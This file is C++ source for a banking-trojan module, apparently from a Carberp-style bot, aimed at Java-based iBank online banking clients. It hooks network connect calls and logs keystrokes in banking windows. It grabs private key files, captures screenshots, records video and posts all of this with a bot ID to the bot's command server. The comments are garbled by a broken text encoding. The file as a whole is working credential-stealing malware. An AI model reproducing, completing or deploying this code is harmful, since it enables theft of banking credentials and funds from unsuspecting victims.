//---------------------------------------------------------------------------


#pragma hdrstop

#include <windows.h>

#include "IBankSystem.h"
#include "UniversalKeyLogger.h"
#include "FileGrabber.h"
#include "Strings.h"
#include "Config.h"
#include "GetApi.h"
#include "Memory.h"
#include "Splice.h"
#include "ScreenShots.h"
#include "Utils.h"
#include "BotClasses.h"
#include "BotHTTP.h"
#include "Loader.h"
//#include "IBankExport.h"
#include "FileGrabber.h"
#include "Utils.h"
#include "VideoRecorder.h"


#include "Modules.h"


//---------------------------------------------------------------------------

#include "BotDebug.h"

namespace IBANKDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// ��������� ������ ������ ���������� �����
#define IBDBG IBANKDEBUGSTRINGS::DBGOutMessage<>
//---------------------------------------------------------------------------


#ifdef JavaConfigH
	char IBankLogPath[] = {'/', 'b', 'o', 't', 'g', 'r', 'a', 'b', 'b', 'e', 'r', '.', 'p', 'h', 'p',  0};
#else
	char IBankLogPath[] = {'/', 'g', 'e', 't', '/', 'i', 'b', 'a', 'n', 'k', '.', 'h', 't', 'm', 'l',  0};
#endif

void SendLogToAdmin( const char* c, const char* v ); //������� ����� � �������
extern char versionPatch[]; //������ �����

namespace IBank
{

	//-----------------------------------------------------------------------
	typedef struct TIBankLog
	{
		DWORD     PID;              // ������������� ��������
		HWND      Wnd;              // ������� ���� �������
		PCHAR     SystemName;       // ��� �������
		PCHAR     KeyFile;          // ��� ����� �����
        PCHAR     Log;              // ��������� ���
		TMemBlock StartScreenShot;  // �������� ��������� ��� ������ �������
		TMemBlock EndScreenShot;    // �������� ��������� ��� �������� �������
		PCHAR     LogFile;          // ��� ����� ����
	} *PIBankLog;

	//-----------------------------------------------------------------------


	// ���������� ���� ��� ��������� �����
	typedef int (WINAPI *PConnect)(SOCKET s, const struct sockaddr *name, int namelen);

	// ���������� ��� �������� ��������� �� �������� �������
	PConnect Real_Connect;

    // ���������� ���������� �������
	PKeyLogSystem System = NULL;
	bool Hooked = false;

	TIBankLog Log;

	DWORD KeyFileNameHash = 0;
	bool recVideoIsRun = false; //������� �� ������� ������ �����

	//-----------------------------------------------------------------------

	void SendIBankLog();

	//-----------------------------------------------------------------------

	//������� ��� ����� ������� ����� ���������� ��� ���� ���������, � ����� �����  ������������ ��� ��������, ��� �������� �� ������������
	PCHAR GetNameForKeyFile(DWORD pid)
	{
		PCHAR path = (PCHAR) HEAP::Alloc(MAX_PATH);
		if( path )
		{
			pGetTempPathA( MAX_PATH, path );
			char buf[32];
			fwsprintfA pwsprintfA = Get_wsprintfA();
			pwsprintfA( buf, "pid_%d", pid );
			pPathAppendA( path, buf );
			char* path2 = UIDCrypt::CryptFileName( path, true );
			IBDBG( "IBANK", "���� �����: %s -> %s", path, path2 );
			HEAP::Free(path);
			path = path2;
		}
		return path;
	}

	void SetKeyFile(PWCHAR FileName)
	{
		// ������������� ���� �����
		if (Log.KeyFile != NULL)
			STR::Free2(Log.KeyFile);

		KeyFileNameHash = CalcHashW(FileName);
		Log.KeyFile = WSTR::ToAnsi(FileName, 0);
		IBDBG("IBank", "��������� ���� ����� %s", Log.KeyFile);
    }

	//-----------------------------------------------------------------------

	//true - ���� ���� �������� ������ ������, � ����� �������� ��� � �������
	int IsFileKeyJava( FileGrabber::ParamEvent* e )
	{
		if( e->unicode )
			SetKeyFile((PWCHAR)e->fileNameW);
		return 0;
	}

	int IsFileKeyJavaW( FileGrabber::ParamEvent* e )
	{
		if( e->unicode )
		{
			//��������� ��� ����� � ����������� �����
			char* nameFile = GetNameForKeyFile( GetParentPID() );
			int len = m_wcslen(e->fileNameW);
			File::WriteBufferA( nameFile, (LPVOID)e->fileNameW, (len + 1) * sizeof(WCHAR) ); //��������� ������ � ����������� �����
			STR::Free(nameFile);
			IBDBG("IBankW", "��������� ���� ����� %ls", e->fileNameW);
		}
		return 0;
	}

	//-----------------------------------------------------------------------


	int WINAPI Hook_Connect( SOCKET s, const struct sockaddr *name, int namelen )
	{
		// ��� ������ �� ������, ��������� �������.
		KeyLogger::CloseSession();

    	return Real_Connect(s, name, namelen);
    }
	//-----------------------------------------------------------------------

	void MakeScreenShot()
	{
    	IBDBG("IBank", "������ ������ ������");
		ScreenShot::MakeToMem(NULL, 0, 0, 0, 0, NULL, (LPBYTE &)Log.StartScreenShot.Data, Log.StartScreenShot.Size);
	}
	//-----------------------------------------------------------------------

	static void ScanPidFile()
	{
		char wjDat[MAX_PATH];
		if( GetAllUsersProfile( wjDat, sizeof(wjDat), "wj.dat" ) )
		{
			DWORD PID = GetUniquePID();
			IBDBG( "IBank", "PID= %d", PID );
			if( File::IsExists(wjDat) )
			{
				DWORD size;
				DWORD* pids = (DWORD*)File::ReadToBufferA( wjDat, size );
				IBDBG( "IBank", "size = %d", size );
				int count = size / 4;

				for( int i = 0; i < count; i++ )
					if( pids[i] == PID )
					{
						PID = 0; //����� ��� ��� ����, ���������� ���� �� �����
						break;
					}
				if( PID ) //��������� ���
				{
					DWORD* pids2 = (DWORD*)MemAlloc(size + 4);
					pids2[0] = PID;
					m_memcpy( &pids2[1], pids, size );
					File::WriteBufferA( wjDat, pids2, size + 4 );
					MemFree(pids2);
				}
				MemFree(pids);
			}
			else
				File::WriteBufferA( wjDat, &PID, sizeof(PID) );
			pMoveFileExA( wjDat, NULL, MOVEFILE_DELAY_UNTIL_REBOOT );
		}
	}

	static void WINAPI ShowWindowIBank(PKeyLogger Logger, DWORD EventID, LPVOID Data)
	{
		TShowWindowData* data = (TShowWindowData*)Data;

		ScanPidFile();
	
		char caption[128];
		pGetWindowTextA( data->Window, caption, sizeof(caption) );
		IBDBG( "IBank", "Hook_ShowWindow %s", caption );

		if( m_strstr( caption, "���� � �������" ) == 0 )
		{
			char patTxt[MAX_PATH];
			if(	GetAllUsersProfile( patTxt, sizeof(patTxt), "Pat.txt" ) )
			{
				File::WriteBufferA( patTxt, (LPVOID)"123",3 );
				if( !recVideoIsRun )
				{
					StartRecordThread( GetUniquePID(), "IBANK", NULL, NULL, 700 );//�������� ����� ������ �����
					recVideoIsRun = true;
				}
			}
		}
	}

	void SetHooks()
	{
		// ������������� �������� ����
		IBDBG( "IBank", "������ ���� ��� %s", System->Name );

		// ������ ��� �� ����������� � �������, ��� ����������� ������� �������
		// �������
		if ( HookApi( 4, 0xedd8fe8a, &Hook_Connect ) )
		{
			__asm mov [Real_Connect], eax
		}

		KeyLogger::ConnectEventHandler( KLE_SHOW_WND, ShowWindowIBank );
    }

	void AddFileGrabber(FileGrabber::TypeFuncReceiver IsFileKey)
	{
		FileGrabber::Init(FileGrabber::CREATEFILEW);
		FileGrabber::Receiver* rv = FileGrabber::CreateReceiver();
		rv->FuncReceiver = IsFileKey;
		rv->minSize = 500;
		rv->maxSize = 3000;
		rv->aw |= FileGrabber::FILEISBIN;
		const char pkFormat[] = { 'P', 'K', 0 };
		FileGrabber::AddIgnoreBeg( rv, pkFormat ); //���������� zip (jar) �����
		FileGrabber::AddReceiver(rv);
	}

	//-----------------------------------------------------------------------
	void SystemActivated(LPVOID Sender)
	{
		System = (PKeyLogSystem)Sender;
pOutputDebugStringA("00");
		// ������������ ������� IBank
		IBDBG("IBank", "������� %s ������������, %08x", System->Name, (DWORD)GetImageBase() );

		// �������������� ������ �������
		PKeyLogger Logger = KeyLogger::GetKeyLogger();
pOutputDebugStringA("01");

		Log.PID     = Logger->PID;
		Log.LogFile = STR::New(Logger->FileName);
pOutputDebugStringA("03");

		// ���������� �������� ����
		Log.Wnd = Logger->ActiveWND;
		HWND Temp = Log.Wnd;
		while (Temp != NULL)
		{
			Temp = (HWND)pGetParent(Temp);
			if (Temp != NULL)
            	Log.Wnd = Temp;
        }
		//�������� ������ ���� (��� �����)
		SendLogToAdmin( "botver", versionPatch );
		//  ������ ����
		if( !Hooked ) 
		{
			SetHooks();
			Hooked = true;
		}
	}

	void SystemActivated2(LPVOID Sender)
	{
		IBDBG("IBank", "������� ��� ������� ������ �����������");
		AddFileGrabber(IsFileKeyJava);
	}

	void SystemActivatedW(LPVOID Sender)
	{
		System = (PKeyLogSystem)Sender;
		AddFileGrabber(IsFileKeyJavaW);
	}

	//-----------------------------------------------------------------------

	void SystemDeactivated(LPVOID Sender)
	{
		if (System == NULL)
			return;

		IBDBG("IBank", "������� %s �������", System->Name);
		FileGrabber::Release();

		//������ ��� ����� ����� ����������� � ������ ��������
		char* nameFile = GetNameForKeyFile( GetUniquePID() );
		if( nameFile )
		{
			DWORD sz;
			//��������� ��� ����� �����
			PWCHAR fileKey = (PWCHAR)File::ReadToBufferA( nameFile, sz );
			if( fileKey )
			{
				if( fileKey[0] ) 
				{
					SetKeyFile(fileKey);
				}
				MemFree(fileKey);
			}
		}

		// ������ �������� ���� �����������
		ScreenShot::MakeToMem(Log.Wnd, 0, 0, 0, 0, NULL, (LPBYTE &)Log.EndScreenShot.Data, Log.EndScreenShot.Size);

		System = NULL;

		// ���������� ���
        SendIBankLog();

		// ����������� ������
		STR::Free2(Log.LogFile);

		if (Log.EndScreenShot.Data != NULL)
		{
			MemFree(Log.EndScreenShot.Data);
			ClearStruct(Log.EndScreenShot);
		}
		
		if( nameFile )
		{
			pDeleteFileA(nameFile); //������� ���� � ������ �����
			STR::Free(nameFile);
		}
	}

	void SystemDeactivated2(LPVOID Sender)
	{
		FileGrabber::Release();
		IBDBG("IBankW", "������" );
	}

	//-----------------------------------------------------------------------

	bool SendLog(PCHAR URL, PIBankLog Log)
	{
		// ���������� ��� �������
		if (STR::IsEmpty(URL) || Log == NULL)
			return false;

        PCHAR UID = GenerateBotID();

		// ��������� ������ ������
		PMultiPartData Data = MultiPartData::Create();


		IBDBG("IBank", "----------- Key:%s<key_end>",  Log->Log);

		MultiPartData::AddStringField(Data, "uid",  UID);
		MultiPartData::AddStringField(Data, "keyhwnd",  Log->Log);
		MultiPartData::AddLongAsStr(Data,   "pid",  Log->PID);
		MultiPartData::AddLongAsStr(Data,   "hwnd", (DWORD)Log->Wnd);


		if (Log->KeyFile != NULL)
        	MultiPartData::AddFileField(Data, "keyfile", Log->KeyFile, NULL);

		if (Log->StartScreenShot.Data != NULL)
		{
			MultiPartData::AddBlobAsFile(Data, "windscreen", "SS_1.png", NULL, (LPBYTE)Log->StartScreenShot.Data, Log->StartScreenShot.Size);
		    //File::WriteBufferA("c:\\SS_1.png", Log->StartScreenShot.Data, Log->StartScreenShot.Size);
        }

		if (Log->EndScreenShot.Data != NULL)
		{
			MultiPartData::AddBlobAsFile(Data, "procscreen", "SS_2.png", NULL, (LPBYTE)Log->EndScreenShot.Data, Log->EndScreenShot.Size);
		   //File::WriteBufferA("c:\\SS_2.png", (LPBYTE)Log->EndScreenShot.Data, Log->EndScreenShot.Size);
        }

		// ���������� ������

		THTTPResponse Response;
    	ClearStruct(Response);

        PCHAR Buf = NULL;


		bool Result = HTTP::Post(URL, Data, &Buf, &Response);


		if (Result)
			Result = CheckValidPostResult(&Response, NULL);

		// ����������� ������
		MultiPartData::Free(Data);
		STR::Free(UID);
		HTTPResponse::Clear(&Response);
		STR::Free(Buf);

		return Result;

	}
	//-----------------------------------------------------------------------

	PCHAR inline GetIBankURL()
	{
		// ������� ���������� ����� ������� ��� �������� ����
		#ifdef JavaConfigH
			return GetJavaScriptURL(IBankLogPath);
		#else
			return GetBotScriptURL(0, IBankLogPath);
		#endif
    }

	//-----------------------------------------------------------------------

	DWORD WINAPI SenderProc(LPVOID Data)
	{
		// ���������� �����

		PIBankLog L = (PIBankLog)Data;
		if (L == NULL)
			return 0;


		for (int i = 1; i <= 10; i++)
		{
			PCHAR URL = GetIBankURL();

		    IBDBG("IBank", "���������� ���. (������� %d) URL - %s", i, URL);

			if (URL != NULL)
			{
				if (SendLog(URL, L))
				{
					IBDBG("IBank", "��� ������� ���������");
					STR::Free(URL);
					break;
				}
			}

            STR::Free(URL);

			pSleep(60000);

		}

        // ���������� ������
		MemFree(L->EndScreenShot.Data);
		STR::Free(L->LogFile);
		STR::Free(L->Log);

		pDeleteFileA(L->LogFile);

		FreeStruct(L);

		return 0;

    }


	void SendIBankLog()
	{
		// ��������� �������� ������
		PIBankLog L = CreateStruct(TIBankLog);

		// �������� ������
		m_memcpy(L, &Log, sizeof(Log));


		L->Log = KLGPacker::GetTextDataFromFile(Log.LogFile);

		// ��� ������� �������� �������� ����� ������� ���� �� ����
//		#ifdef DEBUGCONFIG
//			if (!FileExistsA(Log.LogFile))
//            	MessageBoxA(NULL, "���� �����������", NULL, 0);
//			if (STR::IsEmpty(L->Log))
//				pCopyFileA(Log.LogFile, "c:\\IBankLog.Log", false);
//		#endif


		// ������� ������, ������� ��������� � ������ ������� ������
		Log.LogFile = NULL;
		ClearStruct(Log.EndScreenShot);

		// ��������� �����
		StartThread(SenderProc, L);
    }

#ifdef IBankExportH

BOOL WINAPI Hook_WriteFile( HANDLE hFile, LPCVOID lpBuffer,	DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped )
{
	if( SExpWriteFile( hFile, lpBuffer, nNumberOfBytesToWrite ) ) //������ �������� �� ������, ������� ��� ������ �������
	{
		if( lpNumberOfBytesWritten )
			*lpNumberOfBytesWritten = nNumberOfBytesToWrite;
		return TRUE;
	}
	return Real_WriteFile( hFile, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, lpOverlapped );
}

BOOL WINAPI Hook_CloseHandle( HANDLE hObject )
{
	SExpCloseHandle(hObject);
	return Real_CloseHandle(hObject);
}

#endif

}


//---------------------------------------------------------------------------
void RegisterIBankSystem(DWORD hashApp)
{

	ClearStruct(IBank::Log);


	// ������� ������������ ������� IBANK
	char SysName[]   = {'I', 'B', 'A', 'N', 'K',  0};
	char SysNameW[]  = {'I', 'B', 'A', 'N', 'K', 'W', 0};
	char ClassName[] = {'S','u','n','A','w','t','F','r','a','m','e', 0};;
	char Caption1[]  = {'*', '�', '�', '�', '�', '*',  0};;
	char Caption2[]  = {'*', '�', '�', '*', '�', '*',  0};
	char Caption3[]  = {'*','�','�','�','�','�','�','�','�','�','�','�','�','*', 0}; //������������� � ������

	IBank::System = NULL;

	DWORD hashMain = PROCESS_HASH_JAVA;
	//���� javaw.exe ������� �� �� ��� java.exe, �� �������� ��� ������� ������ ������
	if( hashApp == PROCESS_HASH_JAVAW && GetHashForPid(GetParentPID()) != PROCESS_HASH_JAVA )
		hashMain = PROCESS_HASH_JAVAW;

	PKeyLogSystem S = KeyLogger::AddSystem(SysName, hashMain);

	if (S != NULL)
	{
		IBDBG("IBank", "������� ����������������");
		IBank::System = S;
		S->OnActivate      = IBank::SystemActivated;
		S->OnDeactivate    = IBank::SystemDeactivated;
		S->DontSendLog     = true;
		S->TimeMode		   = KLG_TIME_INFINITE;

		IBank::MakeScreenShot();

		// ��������� ������� ����
		PKlgWndFilter F;
		F = KeyLogger::AddFilter(S, true, true, ClassName, Caption1, FILTRATE_PARENT_WND, LOG_ALL, 3);
		if (F != NULL)
		{
			F->CaseSensetive = false;
			F->DontSaveMouseLog = true;
			KeyLogger::AddFilterText(F, NULL, Caption2);
			KeyLogger::AddFilterText(F, NULL, Caption3);
		}

		if( hashMain == PROCESS_HASH_JAVAW ) //������� ������ ��� ������� ������
			S->OnProcessRun = IBank::SystemActivated2;
	}

	if( hashMain != PROCESS_HASH_JAVAW ) //�� ������ ������
	{
		S = KeyLogger::AddSystem(SysNameW, PROCESS_HASH_JAVAW);
		if( S!= NULL )
		{
			IBDBG("IBankW", "������� ����������������");
			IBank::System = S;
			S->OnProcessRun = IBank::SystemActivatedW;
		}
	}
}
